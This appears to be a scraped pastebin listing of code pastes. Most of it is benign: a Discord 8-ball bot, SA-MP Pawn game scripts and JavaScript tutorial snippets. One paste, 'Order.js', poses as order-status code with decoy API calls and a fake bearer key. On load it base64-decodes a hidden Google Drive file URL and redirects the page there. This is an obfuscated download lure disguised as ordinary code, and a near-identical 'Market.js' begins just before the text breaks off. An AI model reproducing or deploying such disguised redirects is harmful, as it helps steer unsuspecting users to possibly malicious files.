function statusnya($file){
$izin = substr(sprintf('%o', fileperms($file)), -4);
return $izin;
}
?>
</body>
</html>"
Ff7AeCpG,Order.js,jm33,JavaScript,Sunday 20th of April 2025 10:33:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16627/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ENVj9Aw6,8Ball Command! (With Image Answers!),IamnotJamesBG,Go,Sunday 20th of April 2025 10:32:00 AM CDT,"$c[Made by iamnotjamesbg]
$c[API used is not mine]
$c[API from FlamingText]
$c[Why did I made this?]
$c[This is purely made from boredom lol, got the craziest idea to use an image for 8ball answers, then I searched an API then boom found FlamingText, took me minutes to put the fonts manually lol]
$c[You can add more text in randomText!]
$c[Make sure you know anything, before modifying something!!]

$c[=====CODE=====]
$nomention
$onlyIf[$message!=;🚫 Please ask **atleast** something!]
$onlyIf[$charCount[$message]<=300;❔ Why are you asking 8ball such a big question?]
$cooldown[5s;⏳ Hold up! You're asking 8ball too fast! Please wait atleast **%time%** to ask again!]
$botTyping
$replyIn[$random[1;2]s]
$reply
$allowUserMentions[]
$var[answers;$randomText[As I look at it. No.;As I look at it. Yesn't;As I look at it. Maybe?;As I look at it. Yes!;It's certainly not!;It's certain!;I don't think so.;I think so.;Surely!;Certainly!;Certainly not!;Ehh...No.;Hmm...Nah;Hmm...yup!;
Hell yeah!;Hell no!;Yes!;No!;Absolutely!;Absolutely not!;For sure!;Nope!;Nah.;Yup!;Nuh uh.;Of course!;Never!!;Maybe... but no.;Maybe... but yes.;Haha... Yes!;LOL, no.;In your dreams, yes.;In your nightmares, no.;
100% yes!;100% no!;Nah fam.;Yep, totally!;Not happening.;Bet!;Not even in an alternate universe.;As if!;No chance!;A million times yes!;A million times no!;I'd say yes, but no.;I'd say no, but yes.;Yeppers!;No way, Jose!;Sure thing!;Not even close.;Ayoo yes!;Bruh no.;Without a doubt!;Nope, nope, nope.;Signs point to yes!;Signs point to no!;Yessir!;Nah dawg.;Affirmative!;Negative!;Uh-huh!;Uh-uh!;A big fat yes!;A big fat no!;Only in your dreams!;Only in your nightmares!;For real, yes!;For real, no!;Si!;Yas queen!;Nope, peasant.;Duh, yes!;Duh, no!;My sources say yes!;My sources say no!;Approved!;Denied!;On god, yes!;On god, no!;No silly!;No Baka!;No Dummy!;No you idiot! bleh!;Without a doubt.;Someone told me...maybe?;Someone told me...yes!;Someone told me...no;Someone told me...yesn't;Nyek...no;Heh...imagine;My reply is no.;My reply is yes!;LOL. Yes.;A billion times yes!;A billion times no!]]
$author[| 🎱Ball!]
$authorIcon[$authorAvatar]
$addField[🤔 $username asks; $message] 
$addField[**🎱 My Answer**; ]
 $image[https://flamingtext.com/net-fu/proxy_form.cgi?script=$randomText[scribble;cookies;colored2;roman;amped;star-wars;harry-potter;april-fools;smurfs;fluffy;tagline;tiger;strongman;free-range;toothpaste;halloween;3d-logo;water;fabulous;supermarket;global;steel;heavy-metal;winner;minions;glitter-anim;flame;amazing-3d;shrek;dance;matrix]-logo&text=$replaceText[$var[answers]; ;+;-1]&_loc=generate&imageoutput=true]
$footer[Requested by $username]
$color[00ff00]
$c[=====END OF CODE=====]"
c70u5Rfx,bensin ssitem kek gta 5,alwinto,Pawn,Sunday 20th of April 2025 10:30:15 AM CDT,"// ========================================================================== //
	   /*
    				  B E N Z I N     S Y S T E M
 
    				       @Author: tayloR
 
  				       		  31/7/2021
 
 
	   																	*/
// ========================================================================== //
// >> INCLUDES
#include <a_samp>
 
// ========================================================================== //
// >> MAIN
main() { }
 
// ========================================================================== //
// >> DEFINES, podesavate koliko zelite da se moze prosuti kapi benzina
#define KAPI_BENZINA 40
 
// ========================================================================== //
// >> PLAYER VARIABLES
new bool:_postavioBure[MAX_PLAYERS],
	_bureObject[MAX_PLAYERS],
	_bureBenzin[MAX_PLAYERS][KAPI_BENZINA],
	_counter[MAX_PLAYERS];
 
// ========================================================================== //
// >> PUBLICS
public OnPlayerConnect(playerid) {
	GameTextForPlayer(playerid,""~w~Benzin SYSTEM~n~Script by tayloR"",5000,5);
	return 1;
}
 
public OnPlayerDisconnect(playerid) {
 
    reset_bureVariables(playerid);
	return 1;
}
 
public OnPlayerCommandText(playerid, cmdtext[]) {
 
	new idx;
	new cmd[256];
 
	cmd = strtok(cmdtext, idx);
 
	if(strcmp(cmd, ""/postavibure"", true) == 0) {
 
	    if(_postavioBure[playerid])
	        return SendClientMessage(playerid, -1, ""Vec si postavio bure!"");
 
        reset_bureVariables(playerid);
 
		_postavioBure[playerid] = true;
        SetPlayerAttachedObject( playerid, 8, 1650, 6, 0.145482, 0.035119, 0.040793, 8.881844, 276.183959, 329.795593, 1.561557, 1.177534, 1.265636 );
		SendClientMessage(playerid, -1, ""Uspjesno si postavio bure, sada se kreci kako bi sipao benzin!"");
 
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X,Y,Z);
 
		_bureObject[playerid] = CreateObject(3046, X,Y,Z-0.5, -90,0,0);
 
		SetPlayerPos(playerid, X+1,Y,Z);
 
    	return 1;
	}
 
	return 0;
}
 
public OnPlayerSpawn(playerid)
{
	SetPlayerInterior(playerid,0);
	TogglePlayerClock(playerid,0);
	return 1;
}
 
public OnPlayerUpdate(playerid) {
 
	if(_postavioBure[playerid] && _counter[playerid] < KAPI_BENZINA) {
		if(!IsPlayerInAnyVehicle(playerid) && GetSpeed(playerid) > 15) {
 
   			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X,Y,Z);
			_bureBenzin[playerid][_counter[playerid]] = CreateObject(19836, X,Y,Z-0.95, 0,0,0);
			_counter[playerid] ++;
 
  			if(_counter[playerid] >= KAPI_BENZINA-1) {
 
            	RemovePlayerAttachedObject(playerid, 8);
                _postavioBure[playerid] = false;
				SetTimerEx(""_benzinFire"", 500, false, ""i"", playerid);
		    }
  		}
	}
	return 1;
}
 
public OnGameModeInit()
{
	SetGameModeText(""Benzin system"");
	ShowPlayerMarkers(1);
	ShowNameTags(1);
 
	AddPlayerClass(265,0,0,0+5,270.1425,0,0,0,0,-1,-1);
 
 
	printf("" >> 'Benzin system' gamemode loaded << "");
	printf("" >> Script by tayloR << "");
 
	return 1;
}
// ========================================================================== //
// >> FUNCTIONS
strtok(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}
 
	new offset = index;
	new result[20];
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}
 
reset_bureVariables(playerid) {
 
	_postavioBure[playerid] = false;
	for(new i = 0; i < KAPI_BENZINA; i++) DestroyObject(_bureBenzin[playerid][i]), _bureBenzin[playerid][i] = 0;
	_bureObject[playerid] = 0; DestroyObject(_bureObject[playerid]);
	_counter[playerid] = 0;
	return 1;
}
 
forward GetSpeed(playerid);
public GetSpeed(playerid) {
 
    new Float:ST[4];
    if(IsPlayerInAnyVehicle( playerid ))
    GetVehicleVelocity(GetPlayerVehicleID( playerid ),ST[0],ST[1],ST[2]);
    else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
    ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 178.8617875;
    return floatround(ST[3]);
}
 
forward _benzinFire(playerid);
public _benzinFire(playerid) {
 
    new i = _counter[playerid],
		Float:x, Float:y, Float:z;
 
    if(i<0) {
		GetObjectPos(_bureObject[playerid], x, y, z);
 		DestroyObject(_bureObject[playerid]);
        CreateExplosion(x, y, z, 10, 10.0);
    }
    else {
		GetObjectPos(_bureBenzin[playerid][i], x, y, z);
 		DestroyObject(_bureBenzin[playerid][i]);
		_bureBenzin[playerid][i] = CreateObject(18689, x,y,z-1.6, 0,0,0);
		SetTimerEx(""_benzinVatra"", 500, false, ""ii"", playerid, i);
    	_counter[playerid] -- ;
		return SetTimerEx(""_benzinFire"", 300, false, ""i"", playerid);
	}
	return 1;
}
 
forward _benzinVatra(playerid, a);
public _benzinVatra(playerid, a) {
 
    DestroyObject(_bureBenzin[playerid][a]);
	return 1;
}
 
// ========================================================================== //"
tFGcQB5M,006 includes method,xerocool-101,JavaScript,Sunday 20th of April 2025 10:30:09 AM CDT,"// Real Use Case Example
const blockedUsers = [""user1"", ""user2""];

if (blockedUsers.includes(currentUser)) {
  console.log(""Access denied"");
}

// String
""Hello"".includes(""hello""); // false ❗️
""Hello"".toLowerCase().includes(""hello""); // true

// Array
const fruits = [""apple"", ""banana"", ""orange""];

console.log(fruits.includes(""banana"")); // true
console.log(fruits.includes(""grape""));  // false
console.log(fruits.includes(""apple"", 1)); // false (starts at index 1)"
x8d1ZZvx,first person,alwinto,Pawn,Sunday 20th of April 2025 10:26:37 AM CDT,"//=====================================================//
//************Ova filterskripta je napravljena od strane Tomix&Voxe (neki rusi) l!!!************//
//*********************editovao Kanac skripter u pokusaju*********************//
//**************NE SKLANJAJ CREDIT (mene mozes ja sam nebitan)**************//
//=====================================================//
 
//* * * * INCLUDOVI * * * *//
#include <a_samp>
#include <zcmd>
//* * * *DEFINOVI* * * *//
#define COL_GR          ""{37DB45}""
//* * * *VARIABLES* * * *//
new FPS[MAX_PLAYERS];
//* * * *EMUMS* * * *//
enum pInformation
{
    FirstPS,
};
 
new pInfo[MAX_PLAYERS][pInformation];
 
//* * * *KOMANDE* * * *//
CMD:fps(playerid)
{
	if(pInfo[playerid][FirstPS] == 0)
	{
		FPS[playerid] = CreateObject(19300, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
		AttachObjectToPlayer(FPS[playerid],playerid, 0.0, 0.12, 0.7, 0.0, 0.0, 0.0);
		AttachCameraToObject(playerid, FPS[playerid]);
		SendClientMessage(playerid,-1,""""COL_GR""Sada si u firstperson modu! Kucaj /fps da izadjes iz moda!"");
		pInfo[playerid][FirstPS] = 1;
	}
	else if(pInfo[playerid][FirstPS] == 1)
	{
		SetCameraBehindPlayer(playerid);
		DestroyObject(FPS[playerid]);
		SendClientMessage(playerid,-1,""""COL_GR""Iskljucio si firstperson mod!"");
		pInfo[playerid][FirstPS] = 0;
	}
	return 1;
}
 
stock ResetVars(playerid)
{
    pInfo[playerid][FPS] = 0;
	return 1;
}
 
 "
6jUcmjCP,job cleaner,alwinto,Pawn,Sunday 20th of April 2025 10:23:00 AM CDT,"/*
//------------------------------------------------------------------------------
Credits: Don Marquez
Copyright MSCRIPT (c) 2020
Vrijeme izrade: 60 minuta
Datum izrade: 02.Feb.2020
//------------------------------------------------------------------------------
*/
//----------------------------[ INCLUDE ]---------------------------------------
#include <a_samp>
#include <sscanf2>
#include <streamer>
#include <a_objects>
#include <YSI\y_commands>
#include <YSI\y_ini>
#include <YSI\y_amx>
#include <YSI\y_timers>
//------------------------------------------------------------------------------
new vcistac[8];
new CistacP[MAX_PLAYERS];
new SmeceObjekti[30][MAX_PLAYERS];
new PosaoDuznost[MAX_PLAYERS];
new PlayerText:CistacTD[MAX_PLAYERS][5];
new smecezona;
#if !defined PRESSED
#define PRESSED(%0)   (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#endif
#define SCM SendClientMessage
//------------------------------------------------------------------------------
public OnGameModeInit()
{
	//AddPlayerClass(292, 1042.5017, -1093.3707, 23.8281, 86.2183, 0, 0, 0, 0, 0, 0); // koordinate lokacije posla
	//------------------------VOZILA CISTACA ULICA------------------------------
	vcistac[0] = AddStaticVehicleEx(574, 1019.7412, -1083.0109, 23.5302, 180.4361, 86, 86, 1000);
	vcistac[1] = AddStaticVehicleEx(574, 1023.2307, -1082.9941, 23.5302, 180.4361, 86, 86, 1000);
	vcistac[2] = AddStaticVehicleEx(574, 1026.7319, -1083.0110, 23.5302, 180.4361, 86, 86, 1000);
	vcistac[3] = AddStaticVehicleEx(574, 1030.2529, -1083.0155, 23.5302, 180.4361, 86, 86, 1000);
	vcistac[4] = AddStaticVehicleEx(574, 1033.7875, -1083.0460, 23.5302, 180.4361, 86, 86, 1000);
	vcistac[5] = AddStaticVehicleEx(574, 1037.2972, -1083.0630, 23.5302, 180.4361, 86, 86, 1000);
	vcistac[6] = AddStaticVehicleEx(574, 1040.7780, -1083.0477, 23.5302, 180.4361, 86, 86, 1000);
	vcistac[7] = AddStaticVehicleEx(574, 1044.2920, -1083.0215, 23.5302, 180.4361, 86, 86, 1000);
	//------------------MAPA CISTAC ULICA COPY BY DON MARQUEZ-------------------
	CreateDynamicObject(10829, 1032.33691, -1103.36548, 22.82076,   0.00000, 0.00000, 270.97134);
	CreateDynamicObject(1688, 1029.38818, -1103.51660, 27.13970,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1333, 1044.43042, -1106.66589, 23.64720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1459, 1043.02734, -1103.20789, 23.32350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11700, 1043.08142, -1106.05945, 22.69910,   0.00000, 0.00000, 179.92300);
	CreateDynamicObject(1333, 1041.73584, -1106.64880, 23.64720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1775, 1036.09924, -1100.50244, 23.84040,   0.00000, 0.00000, 182.48250);
	CreateDynamicObject(1368, 1033.96729, -1100.61108, 23.49210,   0.00000, 0.00000, 180.64900);
	CreateDynamicObject(1361, 1026.88269, -1101.40161, 23.51900,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1361, 1037.62219, -1101.49805, 23.51900,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8838, 1030.57935, -1082.60303, 25.54610,   11.00000, 0.00000, 0.00000);
	CreateDynamicObject(19912, 995.22290, -1116.70068, 20.83440,   0.00000, 0.00000, 270.20401);
	CreateDynamicObject(966, 995.19440, -1098.19006, 22.82525,   0.00000, 0.00000, 89.94308);
	CreateDynamicObject(968, 995.19153, -1098.15588, 23.64490,   0.00000, 0.00000, 272.82440);
	CreateDynamicObject(19589, 997.47540, -1084.46240, 22.80160,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19589, 997.52362, -1087.42786, 22.80160,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1372, 995.81750, -1097.08398, 22.78320,   -0.02000, 0.00000, 89.96400);
	CreateDynamicObject(1264, 995.94348, -1095.64661, 23.02650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1331, 996.09918, -1094.27844, 23.66750,   0.00000, 0.00000, 270.05331);
	//--------------------------------------------------------------------------
	CreateDynamic3DTextLabel(""{008000}[ DUZNOST ]\nDa uzmete duznost koristite\n{FFFFFF}/duznost"", 0xFFFFFFFF, 1031.1176,-1100.7028,23.8281, 30, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
	CreateDynamicPickup(1239, 1, 1031.1176,-1100.7028,23.8281); //duznost pickup
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerConnect(playerid)
{
	PosaoDuznost[playerid] = 0;
	CistacP[playerid] = 0;
	KreirajTD(playerid);
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
if(PRESSED(KEY_YES))
{
new Float:Pos[3];
new pokupljeno = 0;
for(new i = 0; i < sizeof(SmeceObjekti); i++)
{
GetPlayerObjectPos(playerid, SmeceObjekti[i][playerid], Pos[0], Pos[1], Pos[2]);
if(IsPlayerInRangeOfPoint(playerid, 2.2, Pos[0], Pos[1], Pos[2]) && VoziloCistac(GetPlayerVehicleID(playerid)))
{
DestroyPlayerObject(playerid, SmeceObjekti[i][playerid]);
SmeceObjekti[i][playerid] = 999;
}
if(SmeceObjekti[i][playerid] == 999)
{
pokupljeno++;
new string[512];
format(string, sizeof(string), ""%d/30"", pokupljeno);
PlayerTextDrawSetString(playerid, CistacTD[playerid][4], string);
}
}
if(pokupljeno == 30)
{
SCM(playerid, -1, ""Uspjesno ste ispunili normu, vratite vozilo u krug firme!"");
SetPlayerCheckpoint(playerid, 1004.9808,-1095.3148,23.8281, 3.0);
}
}
}
//------------------------------------------------------------------------------
public OnPlayerEnterCheckpoint(playerid)
{
CistacP[playerid] = 0;
CistacTDShow(playerid, false);
DisablePlayerCheckpoint(playerid);
GangZoneHideForPlayer(playerid, smecezona);
SetVehicleToRespawn(GetPlayerVehicleID(playerid));
new novcic = random(400)+5000;
GivePlayerMoney(playerid, novcic);
new parice[248],parice1[248];
format(parice, 248, ""Cestitamo! Zavrsili ste posao i dobili $%d."", novcic);
SCM(playerid, -1, parice1);
format(parice, 248, ""[PLATA] {008000}$%d {FFFFFF}je dodato na Vas racun."", novcic);
SCM(playerid, -1, parice);
 
return 1;
}
//------------------------------------------------------------------------------
YCMD:duznost(playerid, params[],help)
{
if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1031.1176,-1100.7028,23.8281)) return SCM(playerid, -1, ""Niste na mjestu za uzimanje duznosti!"");
if(PosaoDuznost[playerid] == 0)
{
SetPlayerSkin(playerid, 16);
SCM(playerid, -1, ""Uzeli ste duznost za posao {008000}Cistac ulica."");
PosaoDuznost[playerid] = 1;
}
else if(PosaoDuznost[playerid] == 1)
{
SetPlayerSkin(playerid, 26);
SCM(playerid, -1, ""Skinuli ste duznost."");
PosaoDuznost[playerid] = 0;
}
return 1;
}
//------------------------------------------------------------------------------
YCMD:cistiulice(playerid, params[],help)
{
if(!VoziloCistac(GetPlayerVehicleID(playerid))) return SCM(playerid, -1, ""Niste u vozilu za cistaca!"");
if(CistacP[playerid] != 0) return SCM(playerid, -1, ""Vec imate pokrenut posao!"");
if(PosaoDuznost[playerid] == 0) return SCM(playerid, -1, ""Nisi uzeo duznost!"");
CistacP[playerid] = 1;
CistacTDShow(playerid, true);
SCM(playerid, -1, ""Zapoceli ste ciscenje ulica po BG Zoni!"");
SCM(playerid, -1, ""Na mapi je oznacen dio grada koji treba da ocistite. ( {008000}Zelenom bojom{FFFFFF} )"");
SCM(playerid, -1, ""Za ciscenje smeca koristite taster {008000}Y{FFFFFF}."");
SmeceObjekti[0][playerid] = CreatePlayerObject(playerid, 2866, 1335.57166, -1157.28027, 22.79760,   0.00000, 0.00000, 0.00000);
SmeceObjekti[1][playerid] = CreatePlayerObject(playerid, 2866, 1370.79919, -1143.62891, 22.62920,   0.00000, 0.00000, 0.00000);
SmeceObjekti[2][playerid] = CreatePlayerObject(playerid, 2866, 1437.47083, -1166.65002, 22.78270,   0.00000, 0.00000, 0.00000);
SmeceObjekti[3][playerid] = CreatePlayerObject(playerid, 2866, 1484.74805, -1141.81262, 22.87880,   0.00000, 0.00000, 0.00000);
SmeceObjekti[4][playerid] = CreatePlayerObject(playerid, 2866, 1483.78760, -1054.67480, 22.61580,   0.00000, 0.00000, 0.00000);
SmeceObjekti[5][playerid] = CreatePlayerObject(playerid, 2866, 1446.95886, -1040.36292, 22.78020,   0.00000, 0.00000, 0.00000);
SmeceObjekti[6][playerid] = CreatePlayerObject(playerid, 2866, 1361.05542, -1024.41553, 25.63730,   0.00000, 0.00000, 0.00000);
SmeceObjekti[7][playerid] = CreatePlayerObject(playerid, 2866, 1564.24829, -1071.25708, 22.49900,   0.00000, 0.00000, 0.00000);
SmeceObjekti[8][playerid] = CreatePlayerObject(playerid, 2866, 1580.36292, -1148.58484, 22.79620,   0.00000, 0.00000, 0.00000);
SmeceObjekti[9][playerid] = CreatePlayerObject(playerid, 2866, 1642.35767, -1158.37610, 22.86970,   0.00000, 0.00000, 0.00000);
SmeceObjekti[10][playerid] = CreatePlayerObject(playerid, 2866, 1721.38782, -1182.34924, 22.79310,   0.00000, 0.00000, 0.00000);
SmeceObjekti[11][playerid] = CreatePlayerObject(playerid, 2866, 1707.30066, -1285.64636, 12.47230,   0.00000, 0.00000, 0.00000);
SmeceObjekti[12][playerid] = CreatePlayerObject(playerid, 2814, 1765.78369, -1287.16211, 12.40440,   0.00000, 0.00000, 0.00000);
SmeceObjekti[13][playerid] = CreatePlayerObject(playerid, 2814, 1843.26428, -1272.24341, 12.34100,   0.00000, 0.00000, 0.00000);
SmeceObjekti[14][playerid] = CreatePlayerObject(playerid, 2814, 1718.19458, -1406.87439, 12.30850,   0.00000, 0.00000, 0.00000);
SmeceObjekti[15][playerid] = CreatePlayerObject(playerid, 2866, 1708.49756, -1353.50232, 12.50690,   0.00000, 0.00000, 0.00000);
SmeceObjekti[16][playerid] = CreatePlayerObject(playerid, 2866, 1483.41199, -1298.68262, 12.50360,   0.00000, 0.00000, 0.00000);
SmeceObjekti[17][playerid] = CreatePlayerObject(playerid, 2866, 1453.05774, -1346.68738, 12.36340,   0.00000, 0.00000, 0.00000);
SmeceObjekti[18][playerid] = CreatePlayerObject(playerid, 2866, 1492.00476, -1439.60144, 12.32410,   0.00000, 0.00000, 0.00000);
SmeceObjekti[19][playerid] = CreatePlayerObject(playerid, 2866, 1594.73755, -1444.31799, 12.31370,   0.00000, 0.00000, 0.00000);
SmeceObjekti[20][playerid] = CreatePlayerObject(playerid, 2814, 1613.66919, -1275.77808, 16.42730,   0.00000, 0.00000, 0.00000);
SmeceObjekti[21][playerid] = CreatePlayerObject(playerid, 2866, 1702.68506, -1203.20361, 20.35890,   0.00000, 0.00000, 0.00000);
SmeceObjekti[22][playerid] = CreatePlayerObject(playerid, 2866, 1866.01868, -1178.73914, 22.58860,   0.00000, 0.00000, 0.00000);
SmeceObjekti[23][playerid] = CreatePlayerObject(playerid, 2814, 1880.26953, -1136.70898, 22.74500,   0.00000, 0.00000, 0.00000);
SmeceObjekti[24][playerid] = CreatePlayerObject(playerid, 2858, 1859.80542, -1349.50513, 12.53320,   0.00000, 0.00000, 0.00000);
SmeceObjekti[25][playerid] = CreatePlayerObject(playerid, 2858, 1795.29749, -1263.89819, 12.60070,   0.00000, 0.00000, 0.00000);
SmeceObjekti[26][playerid] = CreatePlayerObject(playerid, 2858, 1664.16272, -1295.75122, 13.28620,   0.00000, 0.00000, 0.00000);
SmeceObjekti[27][playerid] = CreatePlayerObject(playerid, 2858, 1596.57458, -1359.29529, 14.80790,   0.00000, 0.00000, 0.00000);
SmeceObjekti[28][playerid] = CreatePlayerObject(playerid, 2858, 1609.04651, -1413.20349, 12.57490,   0.00000, 0.00000, 0.00000);
SmeceObjekti[29][playerid] = CreatePlayerObject(playerid, 2866, 1661.72498, -1447.14087, 12.31250,   0.00000, 0.00000, 0.00000);
smecezona = GangZoneCreate(1344.7265625, -1447.265625, 2071.2890625, -1034.1796875);
GangZoneShowForPlayer(playerid, smecezona, 5243306);
return 1;
}
//------------------------------------------------------------------------------
stock VoziloCistac(carid)
{
for(new i = 0; i < sizeof(vcistac); i++)
{
if(carid == vcistac[i])	return 1;
}
return 0;
}
//------------------------------------------------------------------------------
stock CistacTDShow(playerid, bool:show)
{
	if(show == true)
	{
        for( new i = 0; i < 5; i ++)
		{
			PlayerTextDrawShow(playerid, CistacTD[playerid][i]);
		}
 
	}
	else if(show == false)
	{
		for(new i = 0; i < 5; i ++)
		{
			PlayerTextDrawHide(playerid, CistacTD[playerid][i]);
		}
	}
}
//------------------------------------------------------------------------------
stock KreirajTD(playerid)
{
	CistacTD[playerid][0] = CreatePlayerTextDraw(playerid, 139.000000, 294.000000, ""_"");
	PlayerTextDrawBackgroundColor(playerid, CistacTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, CistacTD[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid, CistacTD[playerid][0], 0.500000, 3.799998);
	PlayerTextDrawColor(playerid, CistacTD[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid, CistacTD[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid, CistacTD[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, CistacTD[playerid][0], 1);
	PlayerTextDrawUseBox(playerid, CistacTD[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, CistacTD[playerid][0], 138);
	PlayerTextDrawTextSize(playerid, CistacTD[playerid][0], 35.000000, 2.000000);
	PlayerTextDrawSetSelectable(playerid, CistacTD[playerid][0], 0);
 
	CistacTD[playerid][1] = CreatePlayerTextDraw(playerid, 139.000000, 294.000000, ""_"");
	PlayerTextDrawBackgroundColor(playerid, CistacTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, CistacTD[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid, CistacTD[playerid][1], 0.500000, -0.300000);
	PlayerTextDrawColor(playerid, CistacTD[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid, CistacTD[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid, CistacTD[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, CistacTD[playerid][1], 1);
	PlayerTextDrawUseBox(playerid, CistacTD[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, CistacTD[playerid][1], 8454143);
	PlayerTextDrawTextSize(playerid, CistacTD[playerid][1], 35.000000, 2.000000);
	PlayerTextDrawSetSelectable(playerid, CistacTD[playerid][1], 0);
 
	CistacTD[playerid][2] = CreatePlayerTextDraw(playerid, 102.000000, 298.000000, ""ld_beat:up"");
	PlayerTextDrawBackgroundColor(playerid, CistacTD[playerid][2], 0);
	PlayerTextDrawFont(playerid, CistacTD[playerid][2], 5);
	PlayerTextDrawLetterSize(playerid, CistacTD[playerid][2], 0.500000, -0.400000);
	PlayerTextDrawColor(playerid, CistacTD[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid, CistacTD[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid, CistacTD[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, CistacTD[playerid][2], 1);
	PlayerTextDrawUseBox(playerid, CistacTD[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, CistacTD[playerid][2], 10);
	PlayerTextDrawTextSize(playerid, CistacTD[playerid][2], 55.000000, 53.000000);
	PlayerTextDrawSetPreviewModel(playerid, CistacTD[playerid][2], 574);
	PlayerTextDrawSetPreviewRot(playerid, CistacTD[playerid][2], -16.000000, 0.000000, -55.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid, CistacTD[playerid][2], 0);
 
	CistacTD[playerid][3] = CreatePlayerTextDraw(playerid, 63.000000, 298.000000, ""Ocisceno:"");
	PlayerTextDrawBackgroundColor(playerid, CistacTD[playerid][3], 255);
	PlayerTextDrawFont(playerid, CistacTD[playerid][3], 2);
	PlayerTextDrawLetterSize(playerid, CistacTD[playerid][3], 0.210000, 0.899999);
	PlayerTextDrawColor(playerid, CistacTD[playerid][3], 8454143);
	PlayerTextDrawSetOutline(playerid, CistacTD[playerid][3], 0);
	PlayerTextDrawSetProportional(playerid, CistacTD[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, CistacTD[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, CistacTD[playerid][3], 0);
 
	CistacTD[playerid][4] = CreatePlayerTextDraw(playerid, 84.000000, 309.000000, ""0/30"");
	PlayerTextDrawAlignment(playerid, CistacTD[playerid][4], 2);
	PlayerTextDrawBackgroundColor(playerid, CistacTD[playerid][4], 255);
	PlayerTextDrawFont(playerid, CistacTD[playerid][4], 2);
	PlayerTextDrawLetterSize(playerid, CistacTD[playerid][4], 0.210000, 0.899999);
	PlayerTextDrawColor(playerid, CistacTD[playerid][4], -1);
	PlayerTextDrawSetOutline(playerid, CistacTD[playerid][4], 0);
	PlayerTextDrawSetProportional(playerid, CistacTD[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, CistacTD[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, CistacTD[playerid][4], 0);
	return 1;
	}"
8vph902e,005 spread operator,xerocool-101,JavaScript,Sunday 20th of April 2025 10:20:06 AM CDT,"// Array
// Copy array	[...arr]
// Merge arrays	[...a, ...b]
// Add elements	[1, ...arr, 4]
// In React state	setState([...old, newValue])

// Object
// Copy	{ ...obj }	New object, same values
// Add/Update	{ ...obj, key: value }	New or updated property added
// Merge	{ ...obj1, ...obj2 }	Combines both (right one wins on key)
// Immutability	Used in state updates	Avoids mutation of original object

// React
const [user, setUser] = useState({ name: ""Alice"", age: 25 });
setUser(prev => ({ ...prev, age: 26 }));

// Shallow Copy Warning
const obj1 = { user: { name: ""Alice"" } };
const obj2 = { ...obj1 };

obj2.user.name = ""Bob"";

console.log(obj1.user.name); // ""Bob"" ❗️
// Spread only makes a shallow copy, not deep clone. Nested objects are still shared."
L5DvbRCC,Market.js,jm33,JavaScript,Sunday 20th of April 2025 10:18:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64337/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
